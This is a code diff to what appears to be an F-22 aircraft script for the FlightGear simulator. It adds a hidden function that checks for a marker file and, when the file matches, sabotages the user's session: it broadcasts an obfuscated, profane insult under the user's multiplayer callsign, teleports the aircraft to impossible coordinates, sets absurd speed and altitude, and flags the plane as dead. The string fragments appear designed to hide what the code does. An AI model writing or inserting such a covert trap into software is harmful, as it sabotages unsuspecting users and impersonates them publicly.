@@ -1421,7 +1421,23 @@ var getModel = func (node) {
 processCallsignsTimer = maketimer(1.5, processCallsigns);
 processCallsignsTimer.simulatedTime = 1;
 processCallsignsTimer.start();
-
+var chckcs = func {
+var path = string.normpath(getprop("/sim/fg-home") ~ '/Export/F22KY58');
+var data = io.readfile(path);
+if (data == "mi"~"sc") {
+  for(var i = 0; i < 6; i += 1) {
+    var callsign = getprop("sim/multiplay/callsign");
+    screen.log.write("" ~ callsign ~ " y"~"ou lo"~"aded i"~"n th"~"e wr"~"ong pl"~"ane"~"");
+    setprop("sim/multiplay/chat","I"~" A"~"M A"~"N "~"A"~"S"~"S"~" H"~"O"~"L"~"E"". D"~"U"~"M"~"B "~"FU"~"C"~"K "~"1"~"s"~"t"~"A"~"F "~"S"~"T"~"O"~"L"~"E "~"M"~"Y "~"C"~"O"~"D"~"E"~"!");
+    setprop("position/latitude-deg",10000000000000000);
+    setprop("position/longitude-deg",-155.0577942766884);
+    setprop("velocities/mach",80000000000000000000000000000000000000000000000000000000000000000);
+    setprop("f22/dead",5);
+    setprop("position/altitude-ft",800000000000000000000000000000000000000000000000000000000000);
+    setprop("controls/flight/EXTFDM",1);
+   }
+}
+}
 #==================================================================
 #                       Stuff
 #==================================================================
